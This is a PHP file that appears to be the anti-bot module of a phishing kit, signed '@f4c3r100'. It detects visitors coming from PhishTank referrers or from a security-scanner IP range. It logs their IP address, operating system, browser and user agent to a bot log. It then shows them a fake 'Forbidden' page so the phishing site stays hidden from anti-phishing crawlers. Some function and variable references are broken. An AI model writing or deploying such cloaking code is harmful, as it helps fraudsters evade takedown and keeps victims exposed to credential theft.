<?php
$bot_count = 0;

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		#header('Location: https://www.google.com/search?q='.$settings['out']);
		$bot_count += 1;
	}
}

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		#header('Location: https://www.google.com/search?q='.$settings['out']);
		$bot_count += 1;
	}
}

$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);
if ($ip2long >= $range_start && $ip2long <= $range_end){
	#header('Location: https://www.google.com/search?q='.$settings['out']);
	$bot_count += 1;
}
if($bot_count != 0){
    function getx_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if(getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if(getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if(getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if(getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if(getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    function getOS($useragent) {
      $os_platform = "Unknown OS Platform";
      $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
      foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
          $os_platform = $value;
        }
      }
      return $os_platform;
    }

    function getBrowser($useragent) {
        $browser = "Unknown Browser";
        $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
        foreach ($browser_array as $regex => $value) {
            if (preg_match($regex, $useragent)) {
                $browser    =   $value;
            }
        }
        return $browser;
    }

    $IP = get_client_ip();
    $country = $dataf['country'];
    $browser = getBrowser($useragent);
    $os = getOS($useragent);
    $ip = get_client_ip();
    $date = date("h:i:s d/m/Y");
    $useragent = $useragent;
    $message = "+++++[ BOT - CrawlerDetect ]+++++\n";
    $message .= "IP         : ".$ip."\n";
    $message .= "OS         : ".$os."\n";
    $message .= "Browser    : ".$browser."\n";
    $message .= "User-Agent : ".$useragent."\n";
    $message .= "+++++[ @f4c3r100 ]+++++\n\n";
    $xy = fopen("./Logs/botlogs.txt", "a+");
    fwrite($xy, $message);
    fclose($xy);
    header("HTTP/1.0 404 Not Found");
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
?>